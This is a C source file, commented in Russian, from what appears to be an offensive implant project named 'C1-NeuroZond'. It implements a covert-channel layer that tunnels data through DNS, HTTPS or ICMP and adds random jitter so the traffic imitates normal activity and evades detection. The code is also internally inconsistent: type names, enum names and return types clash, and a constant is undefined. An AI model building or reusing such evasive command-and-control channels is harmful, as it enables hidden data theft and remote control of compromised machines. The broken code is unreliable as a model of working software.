/**
 * @file covert_channel.c
 * @brief Модуль скрытой передачи данных для C1-NeuroZond коммуникации
 * @author iamtomasanderson@gmail.com (https://github.com/Personaz1/)
 * @date 2023-09-04
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../network/covert_channel.h"

// --- Прототипы функций для реализаций каналов --- 
// (Сигнатуры должны соответствовать API в covert_channel.h)
typedef void* channel_impl_handle; // Используем void* внутри, но handle остается непрозрачным снаружи

// DNS
extern channel_impl_handle dns_channel_init(const covert_channel_config* config);
extern bool dns_channel_connect(channel_impl_handle handle);
extern size_t dns_channel_send(channel_impl_handle handle, const unsigned char* data, size_t data_len);
extern size_t dns_channel_receive(channel_impl_handle handle, unsigned char* buffer, size_t buffer_size);
extern bool dns_channel_is_connected(channel_impl_handle handle);
extern void dns_channel_cleanup(channel_impl_handle handle);

// HTTPS
extern channel_impl_handle https_channel_init(const covert_channel_config* config);
extern bool https_channel_connect(channel_impl_handle handle);
extern size_t https_channel_send(channel_impl_handle handle, const unsigned char* data, size_t data_len);
extern size_t https_channel_receive(channel_impl_handle handle, unsigned char* buffer, size_t buffer_size);
extern bool https_channel_is_connected(channel_impl_handle handle);
extern void https_channel_cleanup(channel_impl_handle handle);

// ICMP
extern channel_impl_handle icmp_channel_init(const covert_channel_config* config);
extern bool icmp_channel_connect(channel_impl_handle handle);
extern size_t icmp_channel_send(channel_impl_handle handle, const unsigned char* data, size_t data_len);
extern size_t icmp_channel_receive(channel_impl_handle handle, unsigned char* buffer, size_t buffer_size);
extern bool icmp_channel_is_connected(channel_impl_handle handle);
extern void icmp_channel_cleanup(channel_impl_handle handle);
extern void icmp_channel_set_jitter(channel_impl_handle handle, unsigned int min_ms, unsigned int max_ms); // Оставляем пока для ICMP, т.к. он может иметь свою специфику? Или удалить? Пока оставляю.

// --------------------------------------------------

// Константы для джиттера по умолчанию
#define DEFAULT_JITTER_MIN 100 // мс
#define DEFAULT_JITTER_MAX 500 // мс

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

/**
 * @brief Структура контекста скрытого канала связи
 */
typedef struct {
    covert_channel_type type;         // Тип используемого канала (из enum covert_channel_type)
    channel_impl_handle impl_handle;  // Дескриптор конкретной реализации
    unsigned int jitter_min;          // Минимальное значение случайной задержки в мс
    unsigned int jitter_max;          // Максимальное значение случайной задержки в мс
    bool is_connected;                // Флаг установленного соединения
} CovertChannelContext;

/**
 * @brief Инициализация генератора случайных чисел
 */
static void init_random() {
    static int initialized = 0;
    if (!initialized) {
        srand((unsigned int)time(NULL));
        initialized = 1;
    }
}

/**
 * @brief Получить случайное значение задержки в диапазоне jitter_min...jitter_max
 * 
 * @param context Контекст канала связи
 * @return unsigned int Величина задержки в миллисекундах
 */
static unsigned int get_jitter_delay(CovertChannelContext* context) {
    if (context->jitter_max <= context->jitter_min) {
        return context->jitter_min;
    }
    
    unsigned int range = context->jitter_max - context->jitter_min;
    return context->jitter_min + (rand() % (range + 1));
}

/**
 * @brief Инициализация скрытого канала связи
 * 
 * @param config Конфигурация канала связи
 * @return CovertChannelHandle Дескриптор канала связи или NULL в случае ошибки
 */
CovertChannelHandle covert_channel_init(const CovertChannelConfig* config) {
    if (!config || !config->server_address) {
        return NULL;
    }

    init_random();
    
    CovertChannelContext* context = (CovertChannelContext*)malloc(sizeof(CovertChannelContext));
    if (!context) {
        return NULL;
    }
    
    memset(context, 0, sizeof(CovertChannelContext));
    context->type = config->channel_type;
    context->jitter_min = config->jitter_min > 0 ? config->jitter_min : DEFAULT_JITTER_MIN;
    context->jitter_max = config->jitter_max > context->jitter_min ? config->jitter_max : context->jitter_min + DEFAULT_JITTER_RANGE;
    context->is_connected = 0;
    
    switch (config->channel_type) {
        case CHANNEL_DNS:
            context->impl_handle = dns_channel_init(config);
            break;
        case CHANNEL_HTTPS:
            context->impl_handle = https_channel_init(config);
            break;
        case CHANNEL_ICMP:
            context->impl_handle = icmp_channel_init(config);
            break;
        default:
            free(context);
            return NULL;
    }
    
    if (!context->impl_handle) {
        free(context);
        return NULL;
    }
    
    return (CovertChannelHandle)context;
}

/**
 * @brief Установить соединение по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
bool covert_channel_connect(covert_channel_handle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle) {
        return false;
    }
    
    bool result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_connect(context->impl_handle);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_connect(context->impl_handle);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_connect(context->impl_handle);
            break;
        default:
            return false;
    }
    
    if (result) {
        context->is_connected = true;
    }
    
    return result;
}

/**
 * @brief Отправить данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @param data Буфер с данными для отправки
 * @param data_len Размер буфера с данными
 * @return int Количество отправленных байт или отрицательное значение при ошибке
 */
size_t covert_channel_send(covert_channel_handle handle, const unsigned char* data, size_t data_len) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle || !data || data_len == 0) {
        return 0;
    }
    
    // Добавляем случайную задержку для имитации нормального трафика
    unsigned int delay = get_jitter_delay(context);
    if (delay > 0) {
        #ifdef _WIN32
        Sleep(delay);
        #else
        // В миллисекундах
        struct timespec ts;
        ts.tv_sec = delay / 1000;
        ts.tv_nsec = (delay % 1000) * 1000000L; // Используем L для long
        nanosleep(&ts, NULL);
        #endif
    }
    
    size_t result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_send(context->impl_handle, data, data_len);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_send(context->impl_handle, data, data_len);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_send(context->impl_handle, data, data_len);
            break;
        default:
            return 0;
    }
    
    return result;
}

/**
 * @brief Получить данные по скрытому каналу связи
 * 
 * @param handle Дескриптор канала связи
 * @param buffer Буфер для принимаемых данных
 * @param buffer_size Размер буфера
 * @return int Количество принятых байт или отрицательное значение при ошибке
 */
size_t covert_channel_receive(covert_channel_handle handle, unsigned char* buffer, size_t buffer_size) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle || !buffer || buffer_size == 0) {
        return 0;
    }
    
    // Добавляем случайную задержку для имитации нормального трафика
    unsigned int delay = get_jitter_delay(context);
    if (delay > 0) {
        #ifdef _WIN32
        Sleep(delay);
        #else
        // В миллисекундах
        struct timespec ts;
        ts.tv_sec = delay / 1000;
        ts.tv_nsec = (delay % 1000) * 1000000L; // Используем L для long
        nanosleep(&ts, NULL);
        #endif
    }
    
    size_t result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_receive(context->impl_handle, buffer, buffer_size);
            break;
        default:
            return 0;
    }
    
    return result;
}

/**
 * @brief Проверить, установлено ли соединение по скрытому каналу
 * 
 * @param handle Дескриптор канала связи
 * @return int 1 если соединение установлено, 0 если нет, -1 при ошибке
 */
bool covert_channel_is_connected(covert_channel_handle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context || !context->impl_handle) {
        return false; // Ошибка или не инициализировано
    }
    
    if (!context->is_connected) {
        return false;
    }
    
    bool result;
    switch (context->type) {
        case CHANNEL_DNS:
            result = dns_channel_is_connected(context->impl_handle);
            break;
        case CHANNEL_HTTPS:
            result = https_channel_is_connected(context->impl_handle);
            break;
        case CHANNEL_ICMP:
            result = icmp_channel_is_connected(context->impl_handle);
            break;
        default:
            return false;
    }
    
    // Обновляем внутреннее состояние
    context->is_connected = result;
    
    return result;
}

/**
 * @brief Установить параметры джиттера (случайной задержки) для канала
 * 
 * @param handle Дескриптор канала связи
 * @param min_ms Минимальное значение задержки в мс
 * @param max_ms Максимальное значение задержки в мс
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
void covert_channel_set_jitter(covert_channel_handle handle, unsigned int min_ms, unsigned int max_ms) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context) {
        return; // Ничего не делаем, если хендл невалидный
    }
    
    if (max_ms < min_ms) {
        // Устанавливаем минимальное значение, если макс < мин?
        // Или просто игнорируем? Игнорируем.
        return;
    }
    
    context->jitter_min = min_ms;
    context->jitter_max = max_ms;
    
    // Теперь нужно передать это значение в конкретную реализацию, если она это поддерживает
    // TODO: Решить, нужна ли функция set_jitter в интерфейсе конкретных каналов.
    // Пока оставил вызов для ICMP как пример.
    if (context->type == COVERT_CHANNEL_ICMP) {
        // Предполагаем, что icmp_channel_set_jitter существует и принимает channel_impl_handle
        icmp_channel_set_jitter(context->impl_handle, min_ms, max_ms); 
    }
    // Для DNS и HTTPS предполагаем, что джиттер управляется только централизованно
}

/**
 * @brief Освободить ресурсы, выделенные для скрытого канала связи
 * 
 * @param handle Дескриптор канала связи
 */
void covert_channel_cleanup(CovertChannelHandle handle) {
    CovertChannelContext* context = (CovertChannelContext*)handle;
    if (!context) {
        return;
    }
    
    if (context->impl_handle) {
        switch (context->type) {
            case CHANNEL_DNS:
                dns_channel_cleanup(context->impl_handle);
                break;
            case CHANNEL_HTTPS:
                https_channel_cleanup(context->impl_handle);
                break;
            case CHANNEL_ICMP:
                icmp_channel_cleanup(context->impl_handle);
                break;
            default:
                break;
        }
    }
    
    free(context);
} 